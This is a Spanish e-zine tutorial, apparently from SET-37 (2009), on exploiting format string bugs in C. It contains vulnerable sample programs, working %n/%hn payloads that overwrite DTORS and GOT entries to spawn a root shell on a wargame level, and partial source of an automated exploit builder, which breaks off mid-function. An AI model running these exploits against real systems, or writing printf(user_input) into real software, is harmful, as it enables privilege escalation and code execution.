@@ -1,0 +1,1162 @@
+-[ 0x04 ]--------------------------------------------------------------------
+-[ Explotando Format Strings ]-----------------------------------------------
+-[ by blackngel ]  --------------------------------------------------SET-37-- 
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         by blackngel <blackngel1@gmail.com>
+          ||                      <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+1 - Introduccion
+
+2 - Analisis del Problema
+  2.1 - Leer de la Memoria
+  2.2 - Parametro de Acceso Directo 
+  2.3 - Escribir en la Memoria
+
+3 - Ojetivos
+  3.1 - DTORS (Destructores)
+  3.2 - GOT (Tabla de Offsets Global)
+
+4 - Prueba de Concepto
+  4.1 - Cambio de Orden
+
+5 - Format Strings como BoF's
+
+6 - Automatizacion de Exploits
+
+7 - Conclusion
+
+8 - Referencias
+
+
+
+---[ 1 - Introduccion
+
+Como se vera mas adelante, dentro de las vulnerabilildades de software,
+las "cadenas de formato" quizas sean las mas sencillas de localizar.
+
+Al contrario que un buffer overflow, que depende a veces de muchas otras
+condiciones, o que tal vez solo producen un off-by-one, las cadenas de
+formato siempre se presentan de la misma forma.
+
+El modo en que estos bugs pueden ser explotados, requiere de una profunda
+asimilacion. Pero una vez que se comprende el papel que juega cada elemento
+en el ataque, servira practicamente para el resto de las situaciones.
+
+En su momento me encontre con la dificultad de encontrar documentacion
+decente (o no) que describiera de una forma completa la raiz del problema
+y el ataque completo.
+
+Ahora ya sabeis que es lo que pretende este articulo.
+
+
+
+---[ 2 - Analisis del Problema
+
+En vez de empezar con una historia, veamos dos pequeños ejemplos de
+programas, asi sera evidente el problema:
+
+Correcto:
+
+   int main(int argc, char *argv[])
+   {
+      if(argc > 1)
+         printf("%s", argv[1]);
+      return 0;
+   }
+
+Incorrecto:
+
+   int main(int argc, char *argv[])
+   {
+      if(argc > 1)
+         printf(argv[1]);
+      return 0;
+   }
+
+Todos sabemos como se comportara el primero de los ejemplos, pero tal vez
+no sea asi con el segundo. El problema esta en que esta segunda forma
+permite al usuario introducir testigos de formato, y eso conlleva a
+comportamientos peligrosos. Veamoslo:
+
+blackngel@linux:~$ ./fmt set-ezine
+set-ezine
+blackngel@linux:~$ ./fmt set.%x
+set.bffff74b
+blackngel@linux:~$ 
+
+Como puedes ver, ha sucedido algo extraño, hemos logrado volcar algun
+contenido de la memoria. Veamos algunas cosas mas.
+
+En primer lugar, podriamos decir que son vulnerables a esta clase de bugs
+las siguientes funciones:
+
+   - printf()
+   - sprintf()
+   - fprintf()
+   - snprintf()
+
+Cualquiera de estas, es a su vez un funcion como otra cualquiera, y eso
+significa que sus argumentos son colocados en la memoria, especificamente
+en la pila, de forma ordenada:
+
+   [cadena de formato][parametro 1][parametro 2][parametro 3]
+
+Bueno en realidad, no se encuentran los valores en si, sino sus direcciones
+que apuntan al lugar donde estos valores se encuentran en la memoria. Y
+este comportamiento es mejor todavia. Veamos por que:
+
+blackngel@linux:~$ ./fmt AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+AAAA.bffff727.000000d3.bffff450.bffff5e4.f63d4e2e.00000003.b7e78cbc.41414141
+blackngel@linux:~$
+
+Aja, interesante, hemos empezado a volcar valores de la memoria y al final
+nos encontramos con el valor hexadecimal de nuestra cadena "AAAA". Esto
+tiene sus implicaciones y las iremos viendo a partir de ahora.
+
+Pero antes de seguir veamos los tetigos que tendran su lugar dentro del
+ataque:
+
+    %d  -> Formato de un entero
+    %u  -> Formato de un entero sin signo
+    %s  -> Formato de una cadena
+    %n  -> Numero de bytes escritos hasta el momento.
+   <n>$ -> Parametro de Acceso Directo
+
+El parametro de acceso directo sera explicado en su seccion correspondiente.
+Con respecto al testigo "%n", es muy importante comprenderlo. Un ejemplo:
+
+   printf("Hola%n", num);
+
+Aunque suene extraño al que nunca lo haya visto, esta funcion es de escritura.
+No sustituye el testigo "%n" por el valor de "num", como ocurre en un caso
+normal, sino que coloca en "num" el numero de bytes (caracteres) que han sido
+escritos hasta el momento, en este caso seria un "4". Esto sera totalmente
+crucial mas adelante.
+
+Es tambien de anotar que este testigo se puede utilizar tambien de esta forma:
+"%hn", lo que consigue esa "h", es que en vez de ocupar los 4 bytes, que es lo
+que ocupa normalmente un entero, hace un typecast a un tipo short de modo que
+solo utiliza 2 bytes. Ya se vera su utilidad.
+
+
+
+---[ 2.1 - Leer de la Memoria
+
+Gracias al testigo "%x", hemos podido volcar valores de la memoria, en este
+caso direcciones. Pero cuando deseamos imprimir cadenas utilizamos el testigo
+"%s". Ya que podemos alcanzar la posicion de nuestro primer parametro, podemos
+intentar leer de esa posicion de memoria "0x41414141". Veamos:
+
+blackngel@linux:~$ ./fmt AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s
+Fallo de segmentacion
+blackngel@linux:~$
+
+Bueno, era de esperar, esto ocurre en cualquier clase de buffer overflow, si
+intentamos leer desde una direccion de memoria no mapeada, el programa dara
+un fallo de segmentacion.
+
+Bien, pero repetimos nuevamente que controlamos el primer parametro, que pasa
+si escribimos una direccion conocida e intentamos imprimir su contenido?
+
+Podemos utilizar el programa "getenv" que hemos visto en otros articulos para
+ver la direccion de una variable de entorno e intentar volcar su contenido.
+
+blackngel@linux:~$ ./getenv SHELL
+SHELL is located at 0xbffff78b
+blackngel@linux:~$ ./fmt `perl -e 'print "\x8b\xf7\xff\xbf"'`. \
+                            %08x.%08x.%08x.%08x.%08x.%08x.%08x.%s
+    .bffff729.000000d5.bffff450.bffff5e4.f63d4e2e.00000003.b7e78cbc.
+SHELL=/bin/bash
+blackngel@linux:~$
+
+Bingo, acabamos de comprobar que es posible leer posiciones de memoria
+arbitrarias. Pero esto no es muy util, verdad?
+
+
+
+---[ 2.2 - Parametro de Acceso Directo
+
+Encontrar el primer parametro mientras volcamos la memoria introduciendo
+mas y mas testigos, es un poco incomodo ademas de engorroso. El lenguaje
+de programacion C nos facilita un testigo para saltar un numero dado de
+argumentos y acceder directamente a otro. Algo como esto:
+
+   printf("VAR 3 = %3$d", var1, var2, var3);
+
+Teniendo en cuenta que las tres variables pasadas a printf() son del tipo
+int, el valor que se imprimira en este caso sera el de "var3", ya que le
+decimos mediante "3$" que acceda directamente a el.
+
+Este parametro lo podemos utilizar desde la linea de comandos:
+
+blackngel@linux:~$ ./fmt `perl -e 'print "\x8b\xf7\xff\xbf"'`.%8\$s
+    .SHELL=/bin/bash
+blackngel@linux:~$ 
+
+NOTA: Los 4 primeros caracteres raros, son la direccion que estamos
+      imprimiendo.
+
+Esto es totalmente valido para cualquier otro formato: %d, %s, %x, etc...
+
+
+
+---[ 2.3 - Escribir en la Memoria
+
+Como ya hemos dicho, leer de la memoria no es algo muy atractivo, escribir
+si, dado que asi es como se consigue controlar la ejecucion de un programa.
+
+Hemos visto tambien que la unica forma de escribir valores es utilizando el
+testigo "%n". Veamos como podemos modificar un valor dentro de un programa.
+
+[-----]
+
+int main(int argc, char *argv[])
+{
+   static int value = 0;
+   char nombre[256];
+
+   if (argc < 2)
+      exit(0);
+
+   strncpy(nombre, argv[1], 255);
+   printf("\nTe llamas: ");
+   printf(nombre);
+
+   if (value != 0)
+      system("/bin/sh");
+
+   printf("\n");
+   return 0;
+}
+
+[-----]
+
+Cambiemos el propietario a "root" y veamos su ejecucion:
+
+blackngel@linux:~$ sudo chown root fmtsh
+blackngel@linux:~$ sudo chmod 4755 fmtsh
+blackngel@linux:~$ ./fmtsh set-ezine
+
+Te llamas: set-ezine
+blackngel@linux:~$ 
+
+Vale, esta claro que jamas conseguirmos ejecutar esa preciosa shell con
+permisos de root, ya que la variable "value" no esta bajo el control del
+usuario. O si?
+
+Ya que es una variable estatica y se encuentra en la region BSS de la
+memoria, veamos cual es su direccion:
+
+blackngel@mac:~$ objdump -D ./fmtsh | grep value
+08049760 <value.2514>:
+blackngel@mac:~$
+
+Ahora podriamos utilizar el testigo "%n" para escribir algo en esa direccion,
+en realidad lo que se escribira seran los bytes que printf haya imprimido
+hasta que se encuentra el testigo. El detalle es que al ser superior a cero
+sera suficiente como para que la shell se ejecute:
+
+blackngel@linux:~$ ./fmtsh `perl -e 'print "\x5c\x97\x04\x08"'`%8\$n
+
+sh-3.2$ exit
+exit
+Te llamas:\ 
+blackngel@linux:~$
+
+De modo que hemos utilizado de forma combinada el parametro de acceso
+directo junto con el testigo de escritura. Y lo mejor de todo es que
+hemos tenido exito!
+
+Bien, "value" habra tomado el valor "4" que son los caracteres que printf()
+escribio (la direccion), antes del testigo "%n", pero ahora te preguntaras
+como controlar el valor real que escribes. Pues no es tan dificil, ya que
+el valor es igual al numero de caracteres escritos hasta que se encuentra
+con "%n", seria logico escribir en la cadena tantos caracteres como valor
+queremos situar en la direccion elegida.
+
+Si tienes un conocimiento medio del lenguaje C, sabras que los testigos
+de formato permiten especificar el ancho con que son mostrados los valores.
+En realidad eso es lo que hemos hecho hasta ahora cuando utilizamos los
+testigos "%08x", de modo que obligabamos a que las direcciones tuvieran
+siempre ancho de 8 caracteres a pesar de que el valor sea mas pequeño.
+
+Nosotros podemos volcar un valor de la memoria con un ancho prefijado. Por
+ejemplo, si desearamos escribir un valor 400 en la direccion de memoria
+deseada, podriamos utilizar el siguiente especificador:
+
+blackngel@linux:~$ ./fmtsh `perl -e 'print "\x5c\x97\x04\x08"'`%.400d%8\$n
+
+El punto en "%.400d" sirve para proteger los numeros enteros.
+
+Pero ahora pensemos friamente, si pudieramos ver el valor escrito en
+"0x0804975c", seguramente veriamos un valor "0x194" que en decimal es
+"404", eso es porque no hemos tenido en cuenta los cuatro caracteres
+que ocupa la direccion escrita al principio de la cadena.
+
+De modo que si nos hubieramos dado cuenta de ese detalle, hubieramos
+utilizado un testigo con un ancho de "396" caracteres.
+
+
+
+---[ 3 - Ojetivos
+
+Dos cosas:
+
+La primera es que no siempre encontraremos variables en una aplicacion
+dispuestas a ser modificadas.
+
+La segunda, y la mas importante, es casi imposible que encuentras una
+aplicacion en la que, encima, esa variable te de acceso a la ejecucion
+de una shell.
+
+Pero existen otros objetivos interesantes para sobreescribir. Y pueden
+llevar como consecuencia la ejecucion de codigo arbitraria.
+
+
+
+---[ 3.1 - DTORS (Destructores)
+
+Tal vez los destructores sean mas comunes para aquellos que programen en
+lenguajes orientados a objetos, asi como C++. Pero en C tambien es posible
+definirlos.
+
+Los destructores son funciones que se ejecutaran justo antes de la
+finalizacion de un programa. En C pueden declararse del siguiente modo:
+
+static void funcion_dest(void) __attribute__ ((destructor));
+
+e implementando la funcion como si se tratara de otra cualquiera.
+
+Las direcciones de estos destructores son almacenadas en una seccion
+conocida como DTORS. Analicemos la seccion ".dtors" de una aplicacion
+sin destructores:
+
+blackngel@linux:~$ objdump -s -j .dtors ./fmtsh
+
+./fmtsh:     file format elf32-i386
+
+Contents of section .dtors:
+ 8049640 ffffffff 00000000                    ........        
+blackngel@linux:~$
+
+Cuando un destructor es definido, una direccion es situada entre "0xffffffff"
+y "0x00000000". En este caso la lista esta vacia, pero nosotros podemos sacar
+utilidad igualmente de esta situacion.
+
+La cuestion es que si logramos escribir un valor en __DTOR_END__ que es
+precisamente el final de la lista de destructores "0x00000000", lo que haya
+en esa direccion sera ejecutado a la salida del programa.
+
+DTORS_END desde ahora, esta en "0x0804640" + 4, en este caso, sumamos 4 bytes
+pues el primer valor es __DTOR_LIST__, y tenemos que saltar ese "0xffffffff".
+
+
+
+---[ 3.2 - GOT (Tabla de Offsets Global)
+
+No entrare en detalles, ya que no sirve de mucho para el objetivo que pretende
+este articulo.
+
+La seccion GOT es una region de la memoria que contiene las direcciones
+absolutas a las funciones que son utilizadas a lo largo de un programa.
+
+Veamos en que direccion se encuentra esta tabla:
+
+blackngel@linux:~$ objdump -s -j .got ./fmtsh
+
+./fmtsh:     file format elf32-i386
+
+Contents of section .got:
+ 804971c 00000000                             ....           
+
+Vale, y una vez localizada, estudiemos su contenido:
+ 
+blackngel@linux:~$ gdb -q ./fmtsh
+(gdb) break *main
+Breakpoint 1 at 0x80484a4
+(gdb) run
+Starting program: /home/blackngel/fmtsh 
+
+Breakpoint 1, 0x080484a4 in main ()
+(gdb) x/12x 0x0804971c
+0x804971c <_DYNAMIC+208>:  0x00000000  0x0804964c  0xb7fff668  0xb7ff6c30
+0x804972c <_GLOBAL_OFFSET_TABLE_+12>:  0x0804839a  0x080483aa  0x080483ba  0x080483ca
+0x804973c <_GLOBAL_OFFSET_TABLE_+28>:  0xb7e8b370  0x080483ea  0x080483fa  0x0804840a
+
+Bien bien, asi que esas direcciones corresponden a funciones, no?
+Entremos en ellas para comprobarlo:
+
+   (gdb) x/i 0x0804840a
+   0x804840a <exit@plt+6>:    push   $0x38
+
+   (gdb) x/i 0x080483aa
+   0x80483aa <system@plt+6>:  push   $0x8 
+
+Funciones "exit()" y "system()", todo parece correcto. Por lo tanto, al
+igual que DTORS, si logramos modificar una de estas posiciones de memoria
+por otra que apunte a un SHELLCODE, podremos tomar control del programa.
+
+Pero hay que tener en cuenta que la funcion a la que esta sustituyendo,
+al contrario que DTORS, debe ser ejecutada despues de explotar la cadena
+de formato y antes de que termine el programa. Lo cual quiere decir que,
+si sustituimos la llamada a "system()" por ejemplo, y esta no se ejecuta
+despues de explotar la cadena de formato, nuestro codigo nunca sera llamado
+y por tanto el ShelLcode no se ejecutara.
+
+Puedes seguir estudiando el formato ELF de los binarios en Linux si quieres
+poseer un mayor conocimiento de su composicion interna.
+
+
+
+---[ 4 - Prueba de Concepto
+
+Aprovecharemos la ocasion para superar un reto de cadenas de formato
+presentado en http://www.smashthestack.org.
+
+Veamos el programa vulnerable y la distancia de los parametros:
+
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+        char buf[1024];
+        strncpy(buf, argv[1], sizeof(buf) - 1);
+
+        printf(buf);
+
+        return 0;
+}
+
+NOTA: Anda que no podia ser mas cutre...
+
+level9@io:/levels$ ./level9 AAAA.%08x.%08x.%08x.%08x
+AAAA.bfffde84.000003e7.00000000.41414141 
+
+Perfecto, asi que tenemos nuestro primer parametro en la 4ª posicion.
+
+En este ataque utilizaremos la seccion DTORS, en concreto la direccion
+de DTORS_END con el fin de ejecutar codigo arbitrario. Pero... como?
+
+Pues lo mas sencillo es colocar el contenido de una shellcode en una
+variable de entorno (tal vez precedido de un relleno de NOPS). Luego
+obtendremos su direccion e intentaremos escribirla en DTORS_END, de modo
+que vaya directamente al shellcode al finalizar el programa.
+
+level9@io:/levels$ export MAIL=`perl -e 'print "\x90"x1000'`
+                                               `cat /tmp/sc`
+level9@io:/levels$
+
+NOTA: He dado por supuesto que una shellcode ha sido volcada en "/tmp/sc".
+NOTA2: A partir de aqui algunas ordenes seran cortadas en 2 lineas por el
+       formato del articulo, pero tu debes escribirlas de un solo golpe.
+
+level9@io:/levels$ /tmp/getenv MAIL
+MAIL is located at 0xbfffdb25
+level9@io:/levels$ objdump -s -j .dtors ./level9
+
+./level9:     formato del fichero elf32-i386
+
+Contenido de la seccion .dtors:
+ 8049510 ffffffff 00000000                    ........        
+level9@io:/levels$ 
+
+Bien, ya tenemos la direccion donde se encuentra nuestra SHELLCODE y tambien
+la de DTORS_END, que en este caso es "0x08049514". Ahora solo debemos saber
+como escribir el valor adecuado.
+
+Algunos pensaran lo siguiente: Si la direccion del Shellcode es "0xbfffdb25"
+que traducido a decimal es "3221216037". Un comando como el siguiente deberia
+funcionar:
+
+level9@io:/levels$ ./level9 `perl -e 'print "\x14\x95\x04\x08"'`%.3221216037d%4\$n
+
+Pero en la mayoria de los sistemas esto provocara un fallo de segmentacion,
+ya que no se permite escribir un entero largo de un solo golpe. Pero para
+esto tenemos una solucion.
+
+Ya en una seccion anterior dijimos que podiamos utilizar el testigo "%hn"
+en vez de "%n" para escribir valores tipo "short" que ocupan 2 bytes en vez
+de 4.
+
+Esto es una maravilla ya que podemos escribir un valor largo en dos tiempos.
+Es decir, si necesitamos escribir "0xbfffdb25" en "0x08049514" en realidad
+podemos hacerlo en dos pasos:
+
+"0x08049516" -> "0xbfff"
+"0x08049514" -> "0xdb25"
+
+Debes tener en cuenta, si ya tienes experiencia con los buffer overflow,
+que las direcciones se graban en orden inverso, debido a la estructura
+"little-endian".
+
+Con esto, primero grabamos un valor en los dos ultimos bytes de DTORS_END,
+y luego otro valor en los 2 primeros bytes. Recuerda que podemos seguir
+volcando valores de la memoria:
+
+level9@io:/levels$ ./level9 `perl -e 'print "\x16\x95\x04\x08". \
+                                            "\x14\x95\x04\x08"'`%4\$x.%5\$x
+  8049516.8049514
+level9@io:/levels$ 
+
+Ahora veamos que valores son precisos para la explotacion del programa.
+
+En la primera direccion necesitamos escribir "0xbfff", que en decimal es
+"49151", pero no debemos olvidarnos nuevamente que al haber escrito dos
+direcciones ya llevamos escritos 8 bytes, de modo que para conseguir ese
+valor le restaremos esa cantidad.
+
+0x08049516 -> 49143
+
+Ahora con el siguiente valor. "0xdb25" es en decimal "56101". Y aqui mucha
+gente se confunde, pues intenta escribir este valor tal cual en la segunda
+direccion. Pero otra vez debemos tener en cuenta los bytes que ya hemos
+escrito hasta el momento que son:
+
+8 bytes de las direcciones + 49143 bytes del primer valor. De modo que es
+logico pensar que se han escrito ya tantos bytes como el primer valor short
+necesario, que era "49151".
+
+Para llegar a los 56101 solo tenemos que restarle la cantidad anterior, y
+entonces nos queda:
+
+   56101 - 49151 = 6950
+
+Y entonces tenemos:
+
+level9@io:/levels$ ./level9 `perl -e 'print "\x16\x95\x04\x08"."\x14\x95\x04\x08"'`
+                                                        %.49143d%4\$hn%.6950d%5\$hn
+[00000000000000000..........
+
+............0000000000000000]
+Violacion de segmento
+level9@io:/levels$
+
+Vale no hemos tenido suerte, pero veamos con GDB por que:
+
+level9@io:/levels$ gdb -q ./level9
+Using host libthread_db library "/lib/tls/libthread_db.so.1".
+(gdb) run `perl -e 'print "\x16\x95\x04\x08"."\x14\x95\x04\x08"'`
+                                      %.49143d%4\$hn%.6950d%5\$hn
+[00000000000000000..........
+
+............0000000000000000]
+Program received signal SIGSEGV, Segmentation fault.
+0xc000db26 in ?? ()
+(gdb) 
+
+Aja! Fijate que la direccion donde ha fallado es precisamente los dos valores
+que nosotros hemos escrito + 1:
+
+0xbfff + 1 = 0xc000
+0xdb25 + 1 = 0xdb26
+
+La cuestion es que el "." que protege nuestros enteros ha sido contado tambien
+como un caracter. Simplemente debemos bajar una unidad en el primer valor y
+tambien lo hara automaticamente para el siguiente:
+
+(gdb) run `perl -e 'print "\x16\x95\x04\x08"."\x14\x95\x04\x08"'`
+                                      %.49142d%4\$hn%.6950d%5\$hn
+[00000000000000000..........
+
+............0000000000000000]
+Program received signal SIGSEGV, Segmentation fault.
+0xbfffdb25 in ?? ()
+
+(gdb) (gdb) x/16x 0xbfffdb25
+0xbfffdb25:	0x752f3a6e	0x622f7273	0x2f3a6e69	0x3a6e6962
+0xbfffdb35:	0x7273752f	0x6d61672f	0x4d007365	0x3d4c4941
+0xbfffdb45:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffdb55:	0x90909090	0x90909090	0x90909090	0x90909090
+(gdb) 
+
+Bien, ha vuelto a romper, pero esta vez es porque la direccion devuelta
+por "./getenv" no era totalmente exacta, vemos que el relleno de NOPS se
+encuentra a partir de "0xbfffdb45". La diferencia con la direccion que
+nosotros intentabamos escribir es de "0x20", que en decimal es "32", si
+sumamos este valor al ultimo testigo "%d", caeremos de pleno:
+
+level9@io:/levels$ ./level9 `perl -e 'print "\x16\x95\x04\x08"."\x14\x95\x04\x08"'`
+                                                        %.49142d%4\$hn%.6982d%5\$hn
+[00000000000000000..........
+
+............0000000000000000]
+sh-3.1$ exit
+exit
+level9@io:/levels$
+
+BINGO!!!
+
+Cuando hagas tus pruebas, recuerda que este no es un ataque totalmente ciego
+y puedes comprobar si estas sobreescribiendo la direccion correcta:
+
+Program received signal SIGSEGV, Segmentation fault.
+0xbfffdb25 in ?? ()
+(gdb) x/8x 0x08049514
+0x8049514 <__DTOR_END__>:  0xbfffdb25  0x00000000  0x00000001  0x00000010
+0x8049524 <_DYNAMIC+8>:    0x0000000c  0x0804827c  0x0000000d  0x080484e0
+
+Esta claro verdad? Pero todavia no hemos terminado, sigue leyendo...
+
+
+
+---[ 4.1 - Cambio de Orden
+
+El ejemplo anterior fue perfecto, en el sentido de que primero escribimos
+un valor 49151 y seguidamente alcanzamos el 56101.
+
+Pero piensa friamente que ocurriria si la SHELLCODE estuviera en una
+direccion como "0xbfffa6eb"... Entonces tendriamos:
+
+0xbfff -> 49151 
+0xa6eb -> 42731
+
+Es decir, que el segundo valor que deberiamos escribir es menor que el
+primero. Esto trae la consecuencia de que si primero escribimos 49151
+caracteres con el especificador de anchura, luego no podemos retroceder
+para escribir menos caracteres, es algo obvio };-D
+
+Pero por suerte, el parametro de acceso directo nos permite solucionar este
+grave problema. Ya que podemos primero acceder a la posicion 5 y despues a la
+posicion 4.
+
+Repetimos para que se entienda bien, es obligatorio que siempre se escriba
+primero el valor mas pequeño, ya que no podemos retroceder, pero ya que el
+valor pequeño tiene que ir en la segunda direccion primero utilizaremos el
+testigo "%5$" y despues el "%4$". Algo asi:
+
+./prog `perl -e 'print "\x16\x95\x04\x08"."\x14\x95\x04\x08"'`
+                                   %.42723d%5\$hn%.6420d%4\$hn
+
+Esquematicamente se ve mejor:
+
+                     .______________.
+                     !              |
+   [0x08049516][0x08049514][%.][42731-8-1][d][%5\hn][%.][49151-42731][d][%4\hn]
+       ^_______________________________________________________|
+
+Program received signal SIGSEGV, Segmentation fault.
+0xbfffcdb2 in ?? ()
+(gdb) x/16x 0x08049514
+0x8049514 <__DTOR_END__>:  0xbfffa6eb  0x00000000  0x00000001  0x00000010
+
+DTORS_END se ha escrito perfectamente, pero el programa no rompe justo
+en ese lugar porque seguramente haya encontrado alguna instruccion valida.
+
+La cuestion es que hemos coseguido escribir correctamente nuestra direccion.
+
+Que piensas ahora que ocurriria si cambiaras el orden de las direcciones
+"0x08049516" y "0x08049514"? Pruebalo tu mismo!
+
+Aprovechare este momento para poner aqui la formula presentada en el libro
+"Gray Hat Hacking", que sera muy util para aquellos mas vagos y que les
+duele la cabeza al pensar:
+
+[-----]
+
+HOB -> 2 Bytes superior de la direccion a escribir
+LOB -> 2 Bytes inferiores de la direccion a escribir
+
+o-----------o
+| HOB < LOB |
+o-----------o
+
+[direccion+2][direccion]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]
+
+o-----------o
+| HOB > LOB |
+o-----------o
+
+[direccion+2][direccion]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]
+
+[-----]
+
+En el caso que nosotros explotamos teniamos que "HOB < LOB":
+
+0xbfff < 0xdb25
+
+[direccion + 2] = 0x08049516
+[direccion] = 0x08049514
+[HOB-8] = 49151 - 8 = 49143
+[offset] = 4
+[LOB-HOB] = 56101 - 49151 = 6950
+[offset+1] = 5
+
+El caso que presentamos en esta seccion lo puedes calcular tu mismo.
+
+
+
+---[ 5 - Format Strings como BoF's
+
+Explicaremos en esta seccion algo muy sencillo: Puede un error de cadenas
+de formato ser aprovechado como un Buffer Overflow?
+
+La respuesta es SI. Echa un vistazo al siguiente programa:
+
+[-----]
+
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+   char buffer[32];
+
+   if (strlen (argv[1]) < 32)
+      sprintf(buffer, argv[1]);
+
+   return 0;
+}
+
+[-----]
+
+En principio el programa parece seguro, pues dispone de una comprobacion
+cuyo objetivo es bloquear la llamada a "sprintf()" en caso de que el primer
+argumento proporcionado sea igual o superior a 32 bytes.
+
+Pero un nuevo analisis es requerido. Debes recordar que la forma correcta
+de la funcion es la siguiente:
+
+   int sprintf(char *str, const char *format,...)
+
+Entonces la llamada deberia haberse ejecutado del siguiente modo:
+
+   snprintf(buffer, "%s", argv[1]);
+
+Dado que no ha sido el caso, nadie nos impide especificar un testigo con
+un especificador de anchura arbitrario. Si nosotros introducimos una cadena
+como la siguiente "%.44xAAAA", de nueve caracteres de largo, pasara el test
+de strlen(), y aunque parece demasiado corta como para provocar un
+desbordamiento del buffer, el testigo de anchura se encargara de expandir
+la cadena.
+
+Un analisis con GDB mostrara lo siguiente: 
+
+blackngel@linux:~$ gdb -q ./fsbo
+(gdb) run %.44xAAAA
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/blackngel/fsbo %.44xAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) 
+
+Con esto queda claro entonces que podemos tomar control del programa y
+ejecutar codigo arbitrario.
+
+Por desgracia, este metodo tiene una limitacion. La libreria GNU C tiene
+un bug que hace que el programa termine de forma inesperado si el ancho
+proporcionado en el testigo es superior a 1000.
+
+Esto nos impide desbordar buffer's con tamaños demasiado grandes, pero
+seguira siendo una tecnica util en las demas ocasiones.
+
+
+
+---[ 6 - Automatizacion de Exploits
+
+Acabando de ver los datos necesarios para la explotacion de la vulnerabilidad,
+cabria pensar que la mayoria de ellos son estaticos y/o predecibles:
+
+En un mismo programa:
+
+   - El parametro vulnerable es fijo.
+   - El offset es fijo.
+   - La direccion de DTORS_END es fija.
+
+Debido a todo esto, y dado que automatizar la explotacion de la vulnerabilidad
+es algo mas que viable, he creado un programa que puede operar sobre dos modos.
+
+Solo un requisito es necesario, y es que el usuario debe establecer una
+variable de entorno llamada SHELLCODE. Imaginate que tienes tu shellcode
+en "/tmp/sc", entonces el siguiente comando seria ideal:
+
+   $ export SHELLCODE=`perl -e 'print "\x90"x512'``cat /tmp/sc`
+
+Como puedes observar, introducimos un "NOP cushion" de 512 bytes. Un colchon
+que sera mas que suficiente.
+
+En el primero de los modos que el programa utiliza, el usuario debe especificar
+todos los parametros:
+
+   -p Parametro vunerable
+   -o Offset
+   -t Direccion DTORS_END o GOT
+   -s Direccion SHELLCODE (./getenv)
+
+El programa procedera a la creacion de la cadena adecuada para explotar la
+aplicacion vulnerable. Esto modo es util cuando deseas hacer pruebas manuales
+hardcodeando distintas direcciones objetivo (-t).
+
+En el segundo modo de operacion, llamado "Modo Inteligente", el programa hace
+las pruebas necesarias para calcular todos los valores anteriores de forma
+automatica. Asi que tu unica preocupacion sera tener la variable de entorno
+SHELLCODE correctamente establecida (el programa buscara tambien su direccion).
+
+"iafs", como asi he llamado al programa, diferencia correctamente cuando HOB es
+menor que LOB y viceversa, y crea la cadena de explotacion adecuada segun el caso.
+
+El programa no es ni de cerca perfecto, pero funciona bien en estos casos de
+prueba. Recuerda que si la aplicacion vulnerable trabaja en red, "iafs" no esta
+preparado para el manejo de sockets.
+
+Lo bueno esta es que es perfectamente adaptable para cualquier otra situacion.
+Puedes modificar el codigo y hacer que sea util en tu campo de estudio.
+
+
+[--- iafs.c ---]
+
+#include <errno.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <getopt.h>
+
+unsigned int offset;
+unsigned int vuln_param;
+unsigned long sc_addr;
+unsigned long target_addr;
+char vuln_prog[32];
+
+void find_param(void)
+{
+   int i, j = 1;
+   FILE *cin;
+   char params[1024];
+   char temp[1024];
+
+   printf("\n[!] Buscando argumentos vulnerables");
+
+   strncpy(params, vuln_prog, 31);
+   strncat(params, " 2> /dev/null", 14);
+
+   while (1) {
+
+      strncat(params, " AAAA%x%x%x%x%x%x%x%x%x%x%x%x", 30);
+
+      if ((cin = popen(params, "r")) == NULL) {
+         printf("\n[X] ERROR: popen(): %s\n", strerror(errno));
+         exit(1);
+      }
+
+      memset(temp, 0, sizeof(temp));
+      fgets(temp, sizeof(temp)-1, cin);
+
+      if (strstr(temp, "41414141")) {
+         vuln_param = j;
+         printf("\n[+] Parametro vulnerable: ( %d )", vuln_param);
+         fclose(cin);
+         return;
+      }
+
+      if (j > 30) {
+         printf("\n[X] PROGRAMA NO VULNERABLE\n");
+         exit(1);
+      }
+
+      j += 1;
+   }
+
+   fclose(cin);
+}
+
+void find_offset(void)
+{
+   int i = 1;
+   int j = 1;
+   FILE *cin;
+   char params[1024];
+   char temp[1024];
+
+   printf("\n[!] Buscando valor de OFFSET");
+
+   strncpy(params, vuln_prog, 31);
+   strncat(params, " 2> /dev/null", 14);
+
+   while (i++ < vuln_param) {
+      strncat(params, " A", 3);
+   }  
+   strncat(params, " AAAA", 6);
+
+   while (1) {
+
+      strncat(params, "%x", 3);       if ((cin = popen(params, "r")) == NULL) {
+         printf("\n[X] ERROR: popen(): %s\n", strerror(errno));
+         exit(1);
+      }
+
+      memset(temp, 0, sizeof(temp));
+      fgets(temp, sizeof(temp)-1, cin);
+
+      if (strstr(temp, "41414141")) {
+         offset = j;
+         printf("\n[+] Offset encontrado: ( %d )", offset);
+         fclose(cin);
+         return;
+      }
+
+      if (j > 64) {
+         printf("\n[X] PROGRAMA NO VULNERABLE\n");
+         exit(1);
+      }
+
+      j += 1;
+   }
+
+   fclose(cin);
+}
+
+void find_target(void)
+{
+   FILE *cin;
+   char dir[10];
+   char test[64];
+
+   printf("\n[!] Buscando seccion DTORS en la aplicacion");
+
+   strncpy(test, "objdump -s -j .dtors ", 22);
+   strncat(test, vuln_prog, 16);
+   strncat(test, " | grep 804", 12);
+
+   if ((cin = popen(test, "r")) == NULL) {
+      printf("\n[X] ERROR: Ejecutando -objdump-\n");
+      exit(-1);
+   }
+   fgets(dir, 9, cin);
+   target_addr = strtoul(dir, NULL, 16);
+   target_addr += 4;
+
+   fclose(cin);
+   if (target_addr != 0)
+      printf("\n[+] Direccion DTORS_END encontrada: ( 0x%08x )", target_addr);
+   else {
+      printf("\n[X] ERROR: Direccion DTORS no encontrada\n");
+      exit(-1);
+   }
+}
+
+void find_shell(void)
+{
+   printf("\n[!] Configurando SHELLCODE");
+
